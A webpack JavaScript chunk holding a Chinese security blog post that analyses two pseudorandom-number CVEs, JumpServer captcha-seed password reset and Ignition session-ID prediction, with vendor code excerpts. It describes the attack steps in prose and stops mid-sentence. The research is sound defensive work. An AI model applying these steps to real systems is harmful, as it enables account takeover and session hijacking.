"use strict";(self.webpackChunktest=self.webpackChunktest||[]).push([[1477],{10:n=>{n.exports=JSON.parse('{"blogPosts":[{"id":"analysis-of-pseudorandom-number-problems","metadata":{"permalink":"/blog/analysis-of-pseudorandom-number-problems","editUrl":"https://github.com/TianGongLab/poc_docs/tree/main/blog/2023-11-03-analysis-of-pseudorandom-number-problems/index.md","source":"@site/blog/2023-11-03-analysis-of-pseudorandom-number-problems/index.md","title":"\u4f2a\u968f\u673a\u6570\u95ee\u9898\u6d45\u6790","description":"0x01 \u524d\u8a00","date":"2023-11-03T00:00:00.000Z","formattedDate":"2023\u5e7411\u67083\u65e5","tags":[{"label":"Cryptography","permalink":"/blog/tags/cryptography"}],"readingTime":16.91,"hasTruncateMarker":true,"authors":[{"name":"\u738b\u579a","key":"wangyao04"}],"frontMatter":{"slug":"analysis-of-pseudorandom-number-problems","title":"\u4f2a\u968f\u673a\u6570\u95ee\u9898\u6d45\u6790","authors":"wangyao04","tags":["Cryptography"]},"nextItem":{"title":"Windows\u5185\u6838\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u7814\u7a76","permalink":"/blog/research-on-windows-kernel-race-condition-vulnerabilities"}},"content":"## 0x01 \u524d\u8a00\\n\\n\u968f\u673a\u6570\u5728\u8bb8\u591a\u79d1\u5b66\u548c\u5de5\u7a0b\u9886\u57df\u626e\u6f14\u7740\u91cd\u8981\u89d2\u8272\uff0c\u5c24\u5176\u5728\u8ba1\u7b97\u673a\u79d1\u5b66\u548c\u4fe1\u606f\u5b89\u5168\u9886\u57df\uff0c\u5b83\u7684\u91cd\u8981\u610f\u4e49\u66f4\u662f\u4e0d\u53ef\u5c0f\u89d1\u3002\u5728\u8fd9\u4e2a\u5168\u7403\u6570\u5b57\u5316\u7684\u65f6\u4ee3\uff0c\u6570\u636e\u662f\u6211\u4eec\u7ecf\u6d4e\u548c\u751f\u6d3b\u7684\u6838\u5fc3\uff0c\u6570\u636e\u7684\u5b89\u5168\u548c\u4fdd\u5bc6\u663e\u5f97\u5c24\u4e3a\u91cd\u8981\u3002\u6211\u4eec\u4f7f\u7528\u5bc6\u7801\u4fdd\u62a4\u6211\u4eec\u7684\u94f6\u884c\u8d26\u6237\u3001\u7535\u5b50\u90ae\u4ef6\u3001\u793e\u4ea4\u5a92\u4f53\u8d26\u6237\uff0c\u6211\u4eec\u4f7f\u7528\u52a0\u5bc6\u6280\u672f\u4fdd\u62a4\u6211\u4eec\u901a\u4fe1\u7684\u9690\u79c1\u6027\u3002\u5728\u8fd9\u4e9b\u8fc7\u7a0b\u4e2d\uff0c\u968f\u673a\u6570\u662f\u5176\u4e2d\u6700\u91cd\u8981\u7684\u4e00\u90e8\u5206\uff0c\u5b83\u7528\u4e8e\u5bc6\u7801\u751f\u6210\u3001\u6570\u636e\u52a0\u5bc6\u3001\u8eab\u4efd\u9a8c\u8bc1\u548c\u7f51\u7edc\u534f\u8bae\u5b89\u5168\uff0c\u662f\u4fdd\u8bc1\u7535\u5b50\u4ea4\u6d41\u5b89\u5168\u7684\u4ee4\u724c\u3002\u5982\u679c\u6211\u4eec\u4e0d\u80fd\u4fdd\u8bc1\u6240\u751f\u6210\u7684\u968f\u673a\u6570\u5b9e\u9645\u4e0a\u662f\u968f\u673a\u7684\uff0c\u90a3\u4e48\u5b83\u4eec\u5c31\u53ef\u80fd\u88ab\u9884\u6d4b\uff0c\u8fd9\u5c06\u8ba9\u6211\u4eec\u9762\u4e34\u5b89\u5168\u98ce\u9669\u3002\u56e0\u6b64\uff0c\u5728\u63a2\u8ba8\u968f\u673a\u6570\u7684\u540c\u65f6\uff0c\u6211\u4eec\u987b\u6df1\u5316\u7406\u89e3\u968f\u673a\u6027\u7684\u5b89\u5168\u6027\uff0c\u4ee5\u4fbf\u66f4\u6709\u6548\u5730\u4f7f\u7528\u968f\u673a\u6570\uff0c\u4fdd\u62a4\u81ea\u8eab\u548c\u6570\u636e\u514d\u53d7\u653b\u51fb\u3002\\n\\n\u672c\u6b21\u5206\u4eab\u7684\u4e24\u4e2a\u6848\u4f8b\uff08CVE-2023-42820\u548cCVE-2022-35890\uff09\u5747\u662f\u7531\u4e8e\u968f\u673a\u6570\u4f7f\u7528\u4e0d\u5f53\u4ece\u800c\u5bfc\u81f4\u4e86\u66f4\u52a0\u4e25\u91cd\u7684\u5b89\u5168\u95ee\u9898\u3002\\n\\n\x3c!-- truncate --\x3e\\n\\n## 0x02 \u968f\u673a\u6570\u76f8\u5173\u57fa\u7840\u77e5\u8bc6\\n\\n\u6839\u636e\u5bc6\u7801\u5b66\u539f\u7406\uff0c\u968f\u673a\u6570\u7684\u968f\u673a\u6027\u68c0\u9a8c\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u6807\u51c6\uff1a\\n\\n1. \u7edf\u8ba1\u5b66\u4f2a\u968f\u673a\u6027\uff1a\u5728\u7ed9\u5b9a\u7684\u968f\u673a\u6bd4\u7279\u6d41\u6837\u672c\u4e2d\uff0c1\u7684\u6570\u91cf\u5927\u81f4\u7b49\u4e8e0\u7684\u6570\u91cf\uff0c\u6ee1\u8db3\u8fd9\u7c7b\u8981\u6c42\u7684\u6570\u5b57\u5728\u4eba\u7c7b\u201c\u4e00\u773c\u770b\u4e0a\u53bb\u201d\u662f\u968f\u673a\u7684\\n2. \u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6027\uff1a\u7ed9\u5b9a\u968f\u673a\u6837\u672c\u7684\u4e00\u90e8\u5206\u548c\u968f\u673a\u7b97\u6cd5\uff0c\u4e0d\u80fd\u6709\u6548\u7684\u6f14\u7b97\u51fa\u968f\u673a\u6837\u672c\u7684\u5269\u4f59\u90e8\u5206\\n3. \u771f\u968f\u673a\u6027\uff1a\u968f\u673a\u6837\u672c\u4e0d\u53ef\u91cd\u73b0\\n\\n\u76f8\u5e94\u7684\uff0c\u968f\u673a\u6570\u4e5f\u5206\u4e3a\u4e09\u7c7b\uff1a\\n\\n1. **\u4f2a\u968f\u673a\u6570**\uff1a\u6ee1\u8db3\u7b2c\u4e00\u4e2a\u6761\u4ef6\u7684\u968f\u673a\u6570\\n2. **\u5bc6\u7801\u5b66\u5b89\u5168\u7684\u4f2a\u968f\u673a\u6570**\uff1a\u540c\u65f6\u6ee1\u8db3\u524d\u4e24\u4e2a\u6761\u4ef6\u7684\u968f\u673a\u6570\uff0c\u53ef\u4ee5\u901a\u8fc7\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u8ba1\u7b97\u5f97\u51fa\\n3. **\u771f\u968f\u673a\u6570**\uff1a\u540c\u65f6\u6ee1\u8db3\u4e09\u4e2a\u6761\u4ef6\u7684\u968f\u673a\u6570\\n   * \u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08CSPRNG\uff09\\n\\n   \u76f8\u8f83\u4e8e\u7edf\u8ba1\u5b66\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u548c\u66f4\u5f31\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff0cCSPRNG\u6240\u751f\u6210\u7684\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u5177\u6709\u989d\u5916\u7684\u4f2a\u968f\u673a\u5c5e\u6027\uff0c\u7b80\u5355\u6765\u8bf4CSPRNG\u672c\u8d28\u4e0a\u5c5e\u4e8e\u4e00\u79cd\u5355\u5411\u51fd\u6570\\n\\n    ![\u968f\u673a\u6570\u5206\u7c7b\u4e0e\u5173\u7cfb\u56fe](./25e7fb3b-96a3-4eac-87c0-7f570b849279.png)\\n\\n\u8fd9\u662f\u4e00\u4e2a\u4f7f\u7528python random\u5e93\u751f\u6210\u968f\u673a\u6570\u7684\u4f8b\u5b50\\n\\n```bash\\n>>> import random\\n>>> random.seed(123)\\n>>> random.random()\\n0.052363598850944326\\n>>> random.random()\\n0.08718667752263232\\n>>> random.seed(123)\\n>>> random.random()\\n0.052363598850944326\\n>>> random.random()\\n0.08718667752263232\\n>>> random.random()\\n0.4072417636703983\\n>>> random.seed(123)\\n>>> random.random()\\n0.052363598850944326\\n```\\n\\n\u5bf9\u4e8e\u968f\u673a\u6570\u7684\u4f7f\u7528\uff0c\u4e00\u822c\u662f\u5148\u64ad\u79cd\uff0c\u7136\u540e\u4f7f\u7528rand\u6765\u83b7\u53d6\u968f\u673a\u6570\u3002\u4e0d\u64ad\u79cd\u4f1a\u4f7f\u7528\u9ed8\u8ba4\u7684\u79cd\u5b50\uff0c\u4e0d\u540c\u7684\u8bed\u8a00\u4e0d\u901a\u7248\u672c\u79cd\u5b50\u53ef\u80fd\u4e0d\u4e00\u6837\u3002\u8fd9\u79cd\u901a\u8fc7rand\u51fa\u6765\u7684\u968f\u673a\u6570\uff0c\u5c31\u662f\u4f2a\u968f\u673a\u6570\uff0c\u53ea\u8981\u79cd\u5b50\u56fa\u5b9a\u90a3\u4e48\u6bcf\u6b21\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u5c31\u4f1a\u4e00\u6837\uff0c\u540c\u65f6\u901a\u8fc7\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53d1\u73b0\u4ee5\u4e0b\u7279\u70b9\uff1a\\n\\n* \u5728\u64ad\u79cd\u540e\u4f1a\u91cd\u7f6e\u968f\u673a\u5e8f\u5217\\n* random.seed()\u8fdb\u884c\u64ad\u79cd\u65f6\u5e76\u6ca1\u6709\u4ea7\u751f\u65b0\u7684\u5bf9\u8c61\uff0c\u5c31\u4f1a\u5bf9\u540e\u9762\u7684random\u4ea7\u751f\u5f71\u54cd\uff0c\u90a3\u4e48\u63a8\u65ad**\u64ad\u79cd\u540e\u79cd\u5b50\u5bf9\u64ad\u79cd\u65f6\u7684\u6574\u4e2a\u8fdb\u7a0b\u751f\u6548**\\n  * \u5bf9\u4e8eJava\u8fd9\u79cd\u6709\u65b0\u5bf9\u8c61\u751f\u6210\u7684\u8bed\u8a00\u6765\u8bf4\uff0c\u5982\u679c\u6bcf\u6b21\u90fd\u662f\u8c03\u7528\u7684\u540c\u4e00\u4e2a\u5bf9\u8c61\uff0c\u90a3\u4e48\u4e0e\u4e0a\u9762\u7684\u60c5\u51b5\u4e00\u81f4\uff0c**\u64ad\u79cd\u540e\u4f1a\u5bf9\u8fd9\u4e2a\u5bf9\u8c61\u540e\u9762\u751f\u6210\u7684\u968f\u673a\u6570\u4ea7\u751f\u5f71\u54cd**\\n\\n  ```java\\n  public class A{\\n      public Random random;\\n      public void init(){\\n          long seed = 123456L;\\n          this.random = new Random(seed);\\n      }\\n      public static void main(){\\n          this.init();\\n          int num = this.random.nextInt(100);\\n          int num2 = this.random.nextInt(100);\\n          System.out.println(num + \\" \\" + num2);\\n  \\n      }\\n  }\\n  ```\\n\\n## 0x03 \u7ecf\u5178\u6848\u4f8b\u5206\u6790\\n\\n### \u6848\u4f8b1\u2014\u2014JumpServer \u4efb\u610f\u8d26\u6237\u5bc6\u7801\u91cd\u7f6e(CVE-2023-42820)\\n\\n> *JumpServer \u662f\u5e7f\u53d7\u6b22\u8fce\u7684\u56fd\u4ea7\u5f00\u6e90\u5821\u5792\u673a\uff0c\u662f\u7b26\u5408 4A \u89c4\u8303\u7684\u4e13\u4e1a\u8fd0\u7ef4\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf*\\n\\n**\u6f0f\u6d1e\u4f4d\u4e8e\u627e\u56de\u5bc6\u7801\u65f6\uff0c\u751f\u6210\u76846\u4f4d\u9a8c\u8bc1\u7801\u7b97\u6cd5\u662f\u4f2a\u968f\u673a\uff0c\u4f2a\u968f\u673a\u7684\u79cd\u5b50\u53ef\u83b7\u53d6\uff0c\u4ece\u800c\u53ef\u4ee5\u9884\u6d4b\u9a8c\u8bc1\u7801\uff0c\u6700\u7ec8\u91cd\u7f6e\u4efb\u610f\u8d26\u6237\u5bc6\u7801**\\n\\njumperserver\u627e\u56de\u5bc6\u7801\u65f6\u7684\u6d41\u7a0b\u5982\u4e0b\u56fe\uff08\u8fd9\u91cc\u501f\u7528\u4e00\u4e2a\u77e5\u8bc6\u661f\u7403\u4e2d\u7684\u6d41\u7a0b\u56fe\\n\\n ![](./d840c8a2-98ab-433f-9af9-dbef59d82ffb.png)\\n\\n\u770b\u8d77\u6765\u6d41\u7a0b\u4f3c\u4e4e\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u95ee\u9898\u51fa\u73b0\u5728**\u968f\u673a\u6570\u79cd\u5b50**\u5728\u8bf7\u6c42\u9a8c\u8bc1\u7801\u56fe\u7247\u65f6\u76f4\u63a5\u5c55\u793a\u7ed9\u7528\u6237\uff0c\u4e0b\u9762\u4ece\u6e90\u7801\u5165\u624b\u67e5\u770b\u903b\u8f91\\n\\n\u5148\u770b\u9a8c\u8bc1\u7801\u751f\u6210\u7684\u903b\u8f91\\n\\n```python\\ndef captcha_image(request, key, scale=1):\\n    if scale == 2 and not settings.CAPTCHA_2X_IMAGE:\\n        raise Http404\\n    try:\\n        store = CaptchaStore.objects.get(hashkey=key)\\n    except CaptchaStore.DoesNotExist:\\n        # HTTP 410 Gone status so that crawlers don\'t index these expired urls.\\n        return HttpResponse(status=410)\\n\\n    random.seed(key)  # Do not generate different images for the same key\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t# \u8fd9\u91cc\u7684\u79cd\u5b50\u662f\u5916\u9762\u4f20\u8fdb\u6765\u7684\u53c2\u6570\\n\\n    text = store.challenge\\n...\\n```\\n\\n<https://github.com/mbi/django-simple-captcha/blob/master/captcha/views.py>\\n\\n\u5bfb\u627e\u8fd9\u4e2a\u51fd\u6570\u7684\u8c03\u7528\u5904\\n\\n```python\\nfrom django.urls import re_path\\n\\nfrom captcha import views\\n\\nurlpatterns = [\\n    re_path(\\n        r\\"image/(?P<key>\\\\w+)/$\\",\\n        views.captcha_image,\\n        name=\\"captcha-image\\",\\n        kwargs={\\"scale\\": 1},\\n    ),\\n    re_path(\\n        r\\"image/(?P<key>\\\\w+)@2/$\\",\\n        views.captcha_image,\\n        name=\\"captcha-image-2x\\",\\n        kwargs={\\"scale\\": 2},\\n    ),\\n    re_path(r\\"audio/(?P<key>\\\\w+).wav$\\", views.captcha_audio, name=\\"captcha-audio\\"),\\n    re_path(r\\"refresh/$\\", views.captcha_refresh, name=\\"captcha-refresh\\"),\\n]\\n```\\n\\n<https://github.com/mbi/django-simple-captcha/blob/master/captcha/urls.py#L9>\\n\\n\u53ef\u4ee5\u53d1\u73b0key\u7684\u503c\u5c31\u5b58\u5728\u4e8e\u8bf7\u6c42\u7684url\u4e2d\uff0c\u5982\u4e0b\\n\\n ![](./90c8eae3-425b-4b89-89ae-fd933b7ddf01.png)\\n\\n\u8fd9\u6837\u5c31\u6ee1\u8db3\u4e86\u968f\u673a\u6570\u79cd\u5b50\u53ef\u77e5\u7684\u6761\u4ef6\\n\\n\u518d\u770b\u5bc6\u7801\u627e\u56de\u5730\u65b9\u7684\u903b\u8f91\\n\\n ![](./bb7fd835-eebe-4b21-a9e7-c1eaa1f7e5a3.png)\\n\\n\u8fd9\u91cc\u53ef\u4ee5\u53d1\u73b0\u751f\u6210\u9a8c\u8bc1\u7801\u4e5f\u4f7f\u7528random\u51fd\u6570\uff0c\u5e76\u4e14\u6ca1\u6709\u8fdb\u884c\u91cd\u65b0\u64ad\u79cd\uff0c\u6545\u540e\u7eed\u7684\u968f\u673a\u5e8f\u5217\u5b8c\u5168\u53ef\u4ee5\u8ba1\u7b97\u51fa\u6765\uff0c\u4ece\u800c\u5bfc\u81f46\u4f4d\u9a8c\u8bc1\u7801\u53ef\u4ee5\u76f4\u63a5\u8ba1\u7b97\u51fa\u6765\\n\\n### \u4fee\u590d\\n\\n[fix: \u4fee\u590d random error \xb7 jumpserver/jumpserver@ce645b1 \xb7 GitHub](https://github.com/jumpserver/jumpserver/commit/ce645b1710c5821119f313e1b3d801470565aac)\\n\\n ![](./80ed7e56-6479-4e15-8d03-805762876ac8.png)\\n\\npatch\u662f\u76f4\u63a5\u91cd\u65b0\u5c06None\u4f5c\u4e3a\u79cd\u5b50\u8fdb\u884c\u64ad\u79cd\\n\\n> *random.seed(a=None, version=2) If a is omitted or None , the current system time is used. If randomness sources are provided by the operating system, they are used instead of the system time (see the os.urandom() function for details on availability).*\\n\\n\u67e5\u770b\u624b\u518c\uff0c\u4f7f\u7528None\u4f5c\u4e3a\u79cd\u5b50\uff0c\u5219\\n\\n* \u4f7f\u7528\u7cfb\u7edf\u63d0\u4f9b\u7684\u968f\u673a\u6570\u53d1\u751f\u5668\uff08/dev/urandom\uff09\u4f5c\u4e3a\u79cd\u5b50\\n* \u4f7f\u7528\u5f53\u524d\u65f6\u95f4\u4f5c\u4e3a\u79cd\u5b50\\n\\n\u8fd9\u6837\u5c31\u907f\u514d\u4e86\u751f\u62106\u4f4d\u9a8c\u8bc1\u7801\u65f6\uff0c\u79cd\u5b50\u5df2\u77e5\u4ece\u800c\u53ef\u4ee5\u88ab\u9884\u6d4b\u540e\u7eed\u968f\u673a\u6570\u7684\u60c5\u51b5\\n\\n### \u6848\u4f8b2\u2014\u2014Inductive Ignition session\u52ab\u6301(CVE-2022-35890)\\n\\n> *Inductive Automation Ignition\u662f\u7f8e\u56fdInductive Automation\u516c\u53f8\u7684\u4e00\u5957\u7528\u4e8eSCADA\u7cfb\u7edf\u7684\u96c6\u6210\u8f6f\u4ef6\u5e73\u53f0\u3002\u8be5\u5e73\u53f0\u652f\u6301SCADA\uff08\u6570\u636e\u91c7\u96c6\u4e0e\u76d1\u63a7\u7cfb\u7edf\uff09\u3001HMI\uff08\u4eba\u673a\u754c\u9762\uff09\u7b49*\\n\\n> ignition \u662f2022\u5e74pwn2own\u7684\u6bd4\u8d5b\u9879\u76ee\uff0c\u8be5\u6f0f\u6d1e\u5728\u6bd4\u8d5b\u4e2d\u88ab\u4f7f\u7528\u3002\\n\\n**\u6f0f\u6d1e\u6e90\u4e8e\u751f\u6210session\u4f7f\u7528\u7684\u7b97\u6cd5\u5728Windows\u4e0b\u4e3a\u4f2a\u968f\u673a\u51fd\u6570\uff0c\u4e14\u672a\u4f7f\u7528\u9ed8\u8ba4\u79cd\u5b50\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u7279\u5b9a\u65b9\u6cd5\u6cc4\u9732\u51faseed\u5927\u6982\u8303\u56f4\uff0c\u6700\u7ec8\u7ed3\u5408\u4e00\u5b9a\u6b21\u6570\u7684\u7206\u7834\u5373\u53ef\u52ab\u6301\u771f\u6b63session**\\n\\n\u5148\u770b\u79cd\u5b50\u521d\u59cb\u5316\u7684\u90e8\u5206\\n\\n```java\\nprivate void initRandom() throws Exception {\\n    long seed = System.currentTimeMillis();\\n    char[] entropy = ENTROPY;\\n    for (int i = 0; i < entropy.length; ++i) {\\n        long update = (byte)entropy[i] << i % 8 * 8;\\n        seed ^= update;\\n    }\\n    this.random = new SecureRandom();\\n    this.random.setSeed(seed);\\n    this.digest = MessageDigest.getInstance(\\"SHA-1\\");\\n}\\n```\\n\\ninitRandom\u4f4d\u4e8eGatewaySessionManager\u521a\u542f\u52a8\u65f6\uff0c\u8fd9\u91cc\u521d\u59cb\u5316\u4e86\u79cd\u5b50\uff0c\u4f7f\u7528\u7684\u968f\u673a\u51fd\u6570\u4e3ajava.security.SecureRandom()\\n\\n```java\\npublic GWSession createSession() {\\n    GWSession session = new GWSession(this.generateSessionId());\\n    session.startup(this.context);\\n    this.sessions.put(session.getId(), session);\\n    this.log.debug((Object)(\\"Created new session: \\" + session.getPublicId()));\\n    this.statusTags.refresh();\\n    return session;\\n}\\n```\\n\\n\u521b\u5efasession\u4f4d\u4e8e\u7528\u6237\u6210\u529f\u767b\u5f55\u5904\uff0c\u518d\u770b\u5177\u4f53\u751f\u6210session\u7684\u7b97\u6cd5\\n\\n```java\\nprotected synchronized String generateSessionId() {\\n    byte[] random = new byte[16];\\n    String result = null;\\n    StringBuffer buffer = new StringBuffer();\\n    do {\\n        int resultLenBytes = 0;\\n        if (result != null) {\\n            buffer = new StringBuffer();\\n            ++this.duplicates;\\n        }\\n        while (resultLenBytes < this.sessionIdLength) {\\n            this.random.nextBytes(random);\\n            random = this.digest.digest(random);\\n            for (int j = 0; j < random.length && resultLenBytes < this.sessionIdLength; ++resultLenBytes, ++j) {\\n                byte b1 = (byte)((random[j] & 0xF0) >> 4);\\n                byte b2 = (byte)(random[j] & 0xF);\\n                if (b1 < 10) {\\n                    buffer.append((char)(48 + b1));\\n                } else {\\n                    buffer.append((char)(65 + (b1 - 10)));\\n                }\\n                if (b2 < 10) {\\n                    buffer.append((char)(48 + b2));\\n                    continue;\\n                }\\n                buffer.append((char)(65 + (b2 - 10)));\\n            }\\n        }\\n    } while (this.sessions.get(result = buffer.toString()) != null);\\n    return result;\\n}\\n```\\n\\n\u8fd9\u91cc\u4f7f\u7528\u4e86this.random\u751f\u6210\u968f\u673a\u6570\uff0c\u4e5f\u5c31\u662f\u4e0a\u9762\u64ad\u79cd\u4e86\u65f6\u95f4\u6233\u4f5c\u4e3a\u79cd\u5b50\u7684\u968f\u673a\u51fd\u6570\uff0c\u90a3\u4e48\u53ef\u80fd\u5b58\u5728\u88ab\u9884\u6d4b\u7684\u98ce\u9669\\n\\n\u67e5\u8be2java.security.SecureRandom\u5728windows\u5e73\u53f0\u4e0a\u5e95\u5c42\u8c03\u7528\u7684\u51fd\u6570\uff0c\u5728stack overflow\u4e0a\u627e\u5230\u4e86\u7c7b\u4f3c\u7684\u95ee\u9898\\n\\n* Q: *I am interested in*\xa0`java.util.Random`\xa0and\xa0`java.security.SecureRandom`\xa0classes. I found that\xa0`Random`\xa0uses system clock to generate seed and\xa0`SecureRandom`\xa0uses\xa0`/dev/random`\xa0or\xa0`/dev/urandom`\xa0but these files are on Linux, while on Windows it uses some mistic\xa0`CryptGenRandom`. Even if that is super secure function, do we know from where does it take values? What is the basement to generate seed?\\n\\n  > \u6211\u5bf9 java.util.Random \u548c java.security.SecureRandom \u7c7b\u611f\u5174\u8da3\u3002 \u6211\u53d1\u73b0 Random \u4f7f\u7528\u7cfb\u7edf\u65f6\u949f\u751f\u6210\u79cd\u5b50\uff0cSecureRandom \u4f7f\u7528 /dev/random \u6216 /dev/urandom\uff0c\u4f46\u8fd9\u4e9b\u6587\u4ef6\u4f4d\u4e8e Linux \u4e0a\uff0c\u800c\u5728 Windows \u4e0a\u5219\u4f7f\u7528\u4e00\u4e9b\u795e\u79d8\u7684 CryptGenRandom\u3002 \u5373\u4f7f\u8fd9\u662f\u8d85\u7ea7\u5b89\u5168\u7684\u51fd\u6570\uff0c\u6211\u4eec\u77e5\u9053\u5b83\u4ece\u54ea\u91cc\u83b7\u53d6\u503c\u5417\uff1f \u751f\u6210\u79cd\u5b50\u7684\u5e95\u5c42\u903b\u8f91\u662f\u4ec0\u4e48\uff1f\\n* A: *In Windows\xa0SecureRandom\xa0uses the method\xa0CryptGenRandom\xa0that is part of WinCrypt Windows library (Included in Advapi32.dll of Windows System libraries).*\\n\\n  > \u5728 Windows SecureRandom \u4e2d\uff0c\u4f7f\u7528 CryptGenRandom \u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u662f WinCrypt Windows \u5e93\u7684\u4e00\u90e8\u5206\uff08\u5305\u542b\u5728 Windows \u7cfb\u7edf\u5e93\u7684 Advapi32.dll \u4e2d\uff09\\n\\n\u4e0b\u9762\u662f\u5fae\u8f6f\u5b98\u65b9\u624b\u518c\u5bf9*CryptGenRandom*\u7684\u63cf\u8ff0\uff08\u8282\u9009\uff09\\n\\n* *Software random number generators work in fundamentally the same way. They start with a random number, known as the seed, and then use an algorithm to generate a pseudo-random sequence of bits based on it. The most difficult part of this process is to get a seed that is truly random. This is usually based on user input latency, or the jitter from one or more hardware components.*\\n\\n  > \u8f6f\u4ef6\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u5de5\u4f5c\u65b9\u5f0f\u57fa\u672c\u76f8\u540c\u3002 \u4ed6\u4eec\u4ece\u4e00\u4e2a\u968f\u673a\u6570\uff08\u79f0\u4e3a\u79cd\u5b50\uff09\u5f00\u59cb\uff0c\u7136\u540e\u4f7f\u7528\u7b97\u6cd5\u751f\u6210\u57fa\u4e8e\u5b83\u7684\\\\`**\u4f2a\u968f\u673a\u4f4d\u5e8f\u5217**\u3002 \u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u6700\u56f0\u96be\u7684\u90e8\u5206\u662f\u83b7\u5f97\u771f\u6b63\u968f\u673a\u7684\u79cd\u5b50\u3002 \u8fd9\u901a\u5e38\u57fa\u4e8e\u7528\u6237\u8f93\u5165\u5ef6\u8fdf\u6216\u6765\u81ea\u4e00\u4e2a\u6216\u591a\u4e2a\u786c\u4ef6\u7ec4\u4ef6\u7684\u6296\u52a8\u3002\\n\\n\u901a\u8fc7\u624b\u518c\uff0c\u6211\u4eec\u53ef\u77e5Windows\u5e95\u5c42\u8c03\u7528\u7684\u662f\u4e2a\u4f2a\u968f\u673a\u51fd\u6570\uff0c\u5e76\u4e14\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f7f\u7528\u7684\u79cd\u5b50\u662f\u4e00\u4e2a\u5f88\u96be\u9884\u6d4b\u7684\u503c\uff0c\u4f46\u662fignition\u4e2d\u9519\u8bef\u7684\u4f7f\u7528\u4e86\u7cfb\u7edf\u65f6\u95f4\u4f5c\u4e3a\u79cd\u5b50\\n\\n**\u5982\u4f55\u83b7\u5f97\u4f2a\u968f\u673a\u79cd\u5b50\uff1f**\\n\\n\u5728ignition gateway\u4e2d\uff0c\u6709\u4e00\u4e2a\u7279\u6b8a\u7684servlet\uff0c`scriptModules` \u7528\u4e8e\u83b7\u53d6\u7b2c\u4e09\u65b9\u7684\u811a\u672c\uff0c\u6700\u7ec8\u5c06\u5176\u6253\u5305\u8fd4\u56de\u4e00\u4e2azip\\n\\n\u76f4\u63a5\u8ddf\u5230\u5bf9\u5e94\u903b\u8f91\u5904\\n\\n```java\\nvoid zipThirdPartyScriptModulesAndCalcHash() {\\n\\t  this.thirdPartyZipValid = false;\\n\\t  Object object = this.thirdPartyZipLock;\\n\\t  synchronized (object) {\\n\\t      if (this.thirdPartyZipValid) {\\n\\t          return;\\n\\t      }\\n\\t      try {\\n\\t          File pylibDir = this.getThirdPartyScriptModulesDir();\\n\\t          ZipMap zipMap = new ZipMap();\\n\\t          this.addDirToZip(pylibDir, pylibDir, zipMap);\\n\\t          File tempFile = new File(this.systemManager.getTempDir(), \\"pylib_compressed.zip\\");\\n\\t          zipMap.writeToFile(tempFile);\\n\\t          this.thirdPartyScriptModulesHash = Files.hash((File)tempFile, (HashFunction)Hashing.md5()).toString();\\n\\t      }\\n\\t      catch (Exception e) {\\n\\t          this.log.error(\\"Error calculating 3rd party script zip hash.\\", (Throwable)e);\\n\\t          this.thirdPartyScriptModulesHash = null;\\n\\t      }\\n\\t      finally {\\n\\t          this.thirdPartyZipValid = true;\\n\\t          this.thirdPartyZipLock.notifyAll();\\n\\t      }\\n\\t  }\\n}\\n```\\n\\npylib_compressed.zip\u5728\u6bcf\u6b21ignition\u542f\u52a8\u65f6\u90fd\u4f1a\u91cd\u65b0\u751f\u6210\uff0c\u5bf9\u4e8e\u6587\u4ef6\u6765\u8bf4\u4f1a\u6709\u4e00\u4e2a\u6700\u540e\u4fee\u6539\u65f6\u95f4\u7684\u5c5e\u6027\uff0c\u540c\u65f6\u4e0a\u9762\u6240\u8bf4\u7684\u968f\u673a\u6570\u521d\u59cb\u5316\u65f6\u4f7f\u7528\u7684\u65f6\u95f4\u6233\u4e5f\u4f1a\u4e0e\u8fd9\u4e2a\u65f6\u95f4\u63a5\u8fd1\\n\\n\u67e5\u770b\u542f\u52a8\u65e5\u5fd7\u53ef\u4ee5\u770b\u5230\u5148\u751f\u6210\u4e86seed\u540e\u542f\u52a8ignition gateway\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u5728zip\u7684\u6700\u540e\u4fee\u6539\u65f6\u95f4\u503c\u51cf\u53bbdelay\u5373\u53ef\uff0c\u4e00\u822c\u6765\u8bf42s\u8db3\u77e3\\n\\n**\u90a3\u4e48\u5728\u7206\u7834seed\u65f6\u5982\u4f55\u77e5\u9053\u5f53\u524dsession\u662f\u5426\u6b63\u786e\uff1f**\\n\\n\u5728gateway\u4e2d\u5904\u7406\u6570\u636e\u5305\u65f6\u5b58\u5728\u5982\u4e0b\u903b\u8f91\\n\\n```java\\nif (!versionHash.isDev() && msg.getVersion() != 0L && versionHash.getHash() != msg.getVersion()) {\\n\\t\\tif (session != null) {\\n\\t\\t    session.setMaxInactiveInterval(10);\\n\\t\\t}\\n\\t\\tthis.printErrorResponse((PrintWriter)out, 309, \\"Version mismatch\\", false);\\n\\t\\treturn;\\n}\\n```\\n\\n\u6b64\u5904\u903b\u8f91\u4f4d\u4e8esession\u6821\u9a8c\u4e4b\u540e\uff0c\u4e5f\u5c31\u662f\u8bf4\u6545\u610f\u8bbe\u7f6e\u9519\u8bef\u7684version\uff0c\u5f53session\u9a8c\u8bc1\u901a\u8fc7\u65f6\uff0c\u5373\u53ef\u5728\u8fd4\u56de\u5305\u4e2d\u770b\u5230309\u7684\u54cd\u5e94\\n\\n\u81f3\u6b64\u5b8c\u6210\u4e86\u6574\u4e2asession\u52ab\u6301\u7684\u6d41\u7a0b\\n\\n\u91cd\u65b0\u68b3\u7406\u4e00\u4e0b\u6574\u4e2a\u6d41\u7a0b\uff1a\\n\\n\u901a\u8fc7scriptModules\u83b7\u53d6\u5230ignition\u542f\u52a8\u7684\u65f6\u95f4 \u2192 